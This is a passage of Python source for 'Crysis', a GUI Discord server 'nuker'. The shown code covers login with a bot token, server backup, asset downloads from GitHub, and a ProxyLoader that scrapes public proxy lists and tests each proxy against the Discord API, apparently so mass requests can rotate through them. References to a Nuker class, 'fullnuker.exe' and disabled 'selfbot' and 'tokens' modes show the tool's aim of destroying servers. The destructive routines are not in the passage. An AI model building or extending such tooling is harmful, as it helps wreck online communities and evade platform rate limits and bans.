                    r = make_request("channels")

                    if r.status_code == 200:

                        parent = {}

                        for x in r.json():
                            if x["parent_id"] == None:
                                parent[x['id']] = f"{x['name'].upper()}|"

                        
                        for y in r.json():
                            if y['parent_id'] != None:
                                parent[y['parent_id']] += f" {y['name']}"
                        

                            
                        for element in parent:
                            res = parent[element]

                            res = res.split("|")

                            ch_name = res[0]

                            txt = res[1].split(" ")[1:]
                            
                            message+= f"\n- {ch_name}:\n"

                            for tx in txt:
                                message+= f"\n    - {tx}\n"
                            
                            message+="\n"
                
                

                

            open(f"{BASE_PATH}\\{server_id}_info.txt","w",encoding="utf-8").write(message)

            messagebox.showinfo("DONE","BACKUP DONE !")

                


                
        main_frame = customtkinter.CTkFrame(main,height=380,width=315,fg_color=button_color,corner_radius=0,border_color=pinky_color,border_width=1.5)
        main_frame.place(relx = 0.215, rely = 0.12)

        mainframe_label = customtkinter.CTkLabel(main_frame,text='SERVER BACKUP',font=title_font).place(relx=0.1,rely=0.052)
        
        backupname = customtkinter.CTkEntry(main_frame,height=20,width=150,placeholder_text='Backup name...',font=input_font,placeholder_text_color=tot_black,border_color=button_color,fg_color=button_color,)
        backupname.place(relx=0.1,rely=0.19)

        prompt_line(main_frame, 0.1, 0.245)

        web_checkbox =  customtkinter.CTkCheckBox(main_frame, fg_color=pinky_color, bg_color=button_color, width=12, height=12, checkbox_width=16, checkbox_height=16, 
                                              border_width=2, corner_radius=2, border_color=pinky_color, hover_color=pinky2_color, checkmark_color='white', 
                                              text='Webhooks', text_color=tot_black, onvalue=1, offvalue=0)
        web_checkbox.place(relx = 0.15, rely= 0.3)

        cha_checkbox =  customtkinter.CTkCheckBox(main_frame, fg_color=pinky_color, bg_color=button_color, width=12, height=12, checkbox_width=16, checkbox_height=16, 
                                              border_width=2, corner_radius=2, border_color=pinky_color, hover_color=pinky2_color, checkmark_color='white', 
                                              text='Channels', text_color=tot_black, onvalue=1, offvalue=0)
        cha_checkbox.place(relx = 0.15, rely= 0.37)

        rol_checkbox =  customtkinter.CTkCheckBox(main_frame, fg_color=pinky_color, bg_color=button_color, width=12, height=12, checkbox_width=16, checkbox_height=16, 
                                              border_width=2, corner_radius=2, border_color=pinky_color, hover_color=pinky2_color, checkmark_color='white', 
                                              text='Roles', text_color=tot_black, onvalue=1, offvalue=0)
        rol_checkbox.place(relx = 0.15, rely= 0.44)

        confirm_button = customtkinter.CTkButton(main_frame,height=20,width=70,text='Confirm',text_color=tot_black,border_color=tot_black,border_width=1.5,bg_color=button_color,fg_color=pinky_color,
                                                 hover_color=pinky2_color,command=backup).place(relx=0.65,rely=0.45)
        
    def get_topmost(main):
        main.wm_attributes("-topmost", topmost_setting)

    def drag(win, event):
        win._x = event.x
        win._y = event.y
    def move(win, event):
        new_x = win.winfo_x() - win._x + event.x
        new_y = win.winfo_y() - win._y + event.y
        win.geometry(f'+{new_x}+{new_y}')
        if motion_setting == 1:
            win.attributes('-alpha', 0.3)
        else:
            pass
    def stop(win, event):
        win.geometry(f'+{win.winfo_x()}+{win.winfo_y()}')
        if motion_setting == 1:
            win.attributes('-alpha', 1.0)
        else:
            pass


def ProxyLoader():
    global proxy_list

    https = [
        f'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all&timeout={random.randint(1000,2500)}&country=all&ssl=all&anonymity=all'
    ]

    proxies_github = requests.get("https://raw.githubusercontent.com/astros3x/Crysis/main/source/proxies.txt")

    if proxies_github.status_code == 200:
        proxies_github = proxies_github.text.split("\n")

    for proxy in proxies_github:
        https.append(proxy)

    th = []
    def download():
        try:

            response = requests.get(pr)

            for proxy in re.findall(re.compile('([0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}):([0-9]{1,5})'), response.text):
                proxy_list.append(proxy[0] + ':' + proxy[1])

        except:
            pass

    for pr in https:
        t = threading.Thread(target=download)
        t.start()
        th.append(t)

    cls()
    print("\n\n\nPROXY DOWNLOADING\n")

    for x in tqdm(range(len(th)), desc="Proxy Downloading"):
        th[x].join()


    th = []
    def check_proxy(proxy):
        global content
        
        try:
            proxies = {
                'https': proxy
            }
            r = requests.get(f'https://discord.com/api/guilds/{server_id}', proxies=proxies, timeout=10)

            if r.status_code == 401:
                content.append(proxy)

        except:
            pass

    print("\n\n\n\nPROXY CHECKING (it can take a few seconds)\n")

    for pr in proxy_list:
        t = threading.Thread(target=check_proxy,args=(pr,))
        t.start()
        th.append(t)

    for x in tqdm(range(len(th)), desc="Proxy Checking"):
        th[x].join()


    msg = f"PROXIES AVAILABLE => {len(content)}/{len(proxy_list)}" 
    
    #TO REMOVE AFTER "PROXY_GUI_LOADING_BAR" INTEGRATION  

    win32gui.ShowWindow(toHide , win32con.SW_HIDE)

    messagebox.showinfo("PROXIES RESULTS",msg)
    print(msg)

    Nuker().mainloop()

try:
    if __name__ == '__main__':

        def cls():
            os.system('cls' if os.name=='nt' else 'clear')

        def show_error(ctx):
            return messagebox.showerror("Error",ctx)

        def find_by_relative_path(relative_path):
            base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
            return os.path.join(base_path, relative_path)

        def open_discord():
            webbrowser.open('https://discord.gg/GDMVrNF8Gr')

        def close():
            if messagebox.askokcancel("Exit", "Are you sure to close Crysis?"):
                sys.exit()

        #movement and topmost variables
        check_topmost = 0
        motion_setting = 0

        #[LISTS]
        content = [] #CHECKED PROXY LIST
        frame_list = []
        proxy_list = [] #NOT CHECKED PROXY LIST
        barbuttons_list = []

        #ASSETS CHECK LISTS
        webhook_file = "bin\\conf\\webhook.json"
        conf = ["config.json","settings.json"]
        assets = ["wall.gif","background.png","ds_logo.png","ico.png","terminal_ico.png","channels_ico.png","spam_ico.png","settings_ico.png", "server_ico.png","backup_ico.png","config_ico.png","roles_ico.png","nuker_ico.png","black_line.png","notification_ico.png","loading.gif","ico.ico"]

        folders = ["bin","bin\\backups\\","bin\\conf\\","bin\\assets\\", "bin\\tools"]
        pointer = 2

        CHECK = [folders,conf,assets]

        print("\n\n[/] Checking assets...\n")

        for ch in CHECK:
            if len(ch) == 5:
                for folder in ch:
                    if not os.path.isdir(folder):
                        os.system(f"mkdir {folder} > nul 2>&1")


            else:
                
                for file in ch:
                    path = folders[pointer]

                    if file != path:
                        try:
                            open(path+file,"rb").read()
                        except FileNotFoundError:
                            print(F"DOWNLOADING > `{file}`")
                            
                            xPath = path.replace("\\","/")
                            
                            r = requests.get(f"https://raw.githubusercontent.com/astros3x/Crysis/main/source/{xPath}{file}")

                            if r.status_code == 200:
                                open(path+file,"wb").write(r.content)
                
                pointer+=1

        cls()
        print("\n\n[+] Check over\n")
        
        #PATHS   
        backup_folder = folders[1]
        conf_root_folder = folders[2]
        assets_folder = folders[3]
        tools_folder = folders[4]

        config_json   = conf_root_folder + conf[0]
        settings_json = conf_root_folder + conf[1]

        fullnuker_path = f"{tools_folder}\\fullnuker.exe"
        
        #FONTS
        input_font    = ('Tahoma', 15)
        button_font   = ('Tahoma', 17)
        title_font    = ('Impact', 18)

        #COLORS
        leftbar_color = '#10002B'
        button_color  = '#3C096C'
        frame_color   = '#3C096C'

        pinky_color   = '#7B2CBF'
        pinky2_color  = '#9D4EDD'


        transparent   = '#242424'
        tot_black     = '#000000'
        tot_white     = '#ffffff'


        #IMAGES
        root_icon   = assets_folder + assets[16]
        wallgif = assets_folder + assets[0]
        loadgif = assets_folder + assets[15]
        notification = assets_folder + assets[14]

        bgicon = PIL.Image.open(assets_folder + assets[3])
        login_background  = customtkinter.CTkImage(Image.open(assets_folder + assets[0]), size=(415, 225))
        main_background   = customtkinter.CTkImage(Image.open(assets_folder + assets[1]), size=(920, 460))

        discord_logo  = customtkinter.CTkImage(Image.open(assets_folder + assets[2]), size=(21, 18))
        login_logo    = customtkinter.CTkImage(Image.open(assets_folder + assets[3]), size=(75, 75))
        main_logo     = customtkinter.CTkImage(Image.open(assets_folder + assets[3]), size=(120, 110))
        terminal_ico  = customtkinter.CTkImage(Image.open(assets_folder + assets[4]), size=(23, 23))
        channels_ico  = customtkinter.CTkImage(Image.open(assets_folder + assets[5]), size=(23, 23))
        messages_ico  = customtkinter.CTkImage(Image.open(assets_folder + assets[6]), size=(23, 23))
        settings_ico  = customtkinter.CTkImage(Image.open(assets_folder + assets[7]), size=(23, 23))
        server_ico    = customtkinter.CTkImage(Image.open(assets_folder + assets[8]), size=(23, 23))
        backup_ico    = customtkinter.CTkImage(Image.open(assets_folder + assets[9]), size=(23, 23))
        folder_ico    = customtkinter.CTkImage(Image.open(assets_folder + assets[10]), size=(23, 23))
        roles_ico     = customtkinter.CTkImage(Image.open(assets_folder + assets[11]), size=(23, 23))
        nuker_ico     = customtkinter.CTkImage(Image.open(assets_folder + assets[12]), size=(23, 23))
        
        line_img      = customtkinter.CTkImage(Image.open(assets_folder + assets[13]), size=(200, 9))
        setsline_img  = customtkinter.CTkImage(Image.open(assets_folder + assets[13]), size=(400, 9))
        
        def startwin(self):
            self.mainloop()

        def start_file(path):
            os.system(f"start {path}")
        
        def id_check(cid):
            if len(cid) >= 16 and len(cid) <= 21:
                return True
            
            else:
                return False

        def clean_frames():
            for i in frame_list:
                for _ in i:
                    try:
                        _.destroy()
                    except Exception:
                        pass

            for i in barbuttons_list:
                for _ in i:
                    try:
                        _.configure(fg_color = leftbar_color)
                    except:
                        pass

        def prompt_line(where, pos_x, pos_y):
            name = customtkinter.CTkLabel(master=where,
                                        height=1,
                                        width=20,
                                        text=None,
                                        image=line_img
                                        )
            
            name.place(relx=pos_x, rely=pos_y)

        try:
            j = json.loads(open(config_json,'r').read())
            
            token = j['token']
            server_id = j['server_id']
            mode = j['mode']
            api = j['api']


            #available = ["bot","tokens","selfbot"]
            available = ["bot"]

            for av in available:
                if mode == av:
                    break
                
                else:
                    raise ValueError() #intentional error

            
            if len(j) != 4:
                raise ValueError() #intentional error

        except:
            show_error("`config.json` is corrupted")
            open(config_json,"w").write(json.dumps({"token" : "", 
                                                    "server_id" : "", 
                                                    "mode" : "bot",
                                                    "api" : "v9"}))

            start_file(config_json)
            sys.exit()



        try:
            with open(settings_json, 'r') as f:
                data = json.load(f)

                data["set_transparency"]
                data["set_topmost"]
            pass

        except:
            show_error("`settings.json` is corrupted\n\n [!] Restart Crysis.")

            open(settings_json,"w").write(json.dumps({"set_transparency" : 0, 
                                                    "set_topmost" : 0}))
            

            start_file(config_json)
            sys.exit()



        basic_headers = {
                    "Authorization" : f"Bot {token}",
                    "Content-Type" : "application/json"
        }

        def community_checker():
            req = requests.get(f'https://discord.com/api/{api}/guilds/{server_id}', headers=basic_headers)
            data = req.json()
            try: 
                if data.get('features', []).count('COMMUNITY') > 0:
                    return True
                
            except IndexError:
                return False

        def save_settings():
            global motion_setting
            global topmost_setting
            global check_topmost
            check_topmost = 0

            transparency_value = data['set_transparency']
            topmost_value      = data['set_topmost']

            if transparency_value == 1:
                motion_setting = 1
                
            elif transparency_value == 0:
                motion_setting = 0

            if topmost_value == 1:
                check_topmost = 1
                topmost_setting = 1

            elif topmost_value == 0:
                check_topmost = 1
                topmost_setting = 0

            global saved
            saved = 0
        
    
        def get_proxy():
            proxy = random.choice(content)
            pr_la_karde = {"https" : proxy}

            return pr_la_karde
        
        def logging_checker():
            l_token = f'https://discord.com/api/{api}/users/@me'
            l_id    = f'https://discord.com/api/{api}/guilds/{server_id}'
            auth    = {'Authorization': f'Bot {token}'}

            rt  = requests.get(l_token, headers=auth)
            rid = requests.get(l_id, headers=auth)

            if rt.status_code and rid.status_code == 200:
                global bot_name
                global server_name
                bot_name = rt.json()['username']
                server_name = rid.json()['name']
                return True
            else:
                return False
        
        def login_notification():
            app = 'CRYSIS'
            crysis_ico = find_by_relative_path(notification)

            if logging_checker() == True:
                noti = Notification(app_id=app,
                            title='Succesfully logged!',
                            msg=f'Bot name: {bot_name}\nServer name: {server_name}\nApi: {api}',
                            duration='short',
                            icon=crysis_ico)
                noti.show()

            elif logging_checker() == False:
                if mode == "bot" or mode == "selfbot":
                    show_error("Invalid credentials (check your `config.json`)")
        
                    start_file(config_json)
                    sys.exit()

                elif mode == "tokens":
                    messagebox.showinfo("Need implementation","SOON.....")
                    sys.exit()

                else:
                    show_error("Invalid credentials (check your `config.json`)")
        

                    start_file(config_json)
                    sys.exit()

        try:
            toHide = win32gui.GetForegroundWindow()
            ProxyLoader()
            
        except:
            pass
except requests.exceptions.ConnectionError:
    messagebox.showerror("Connection Error","[!] No connection avaible.")
    sys.exit()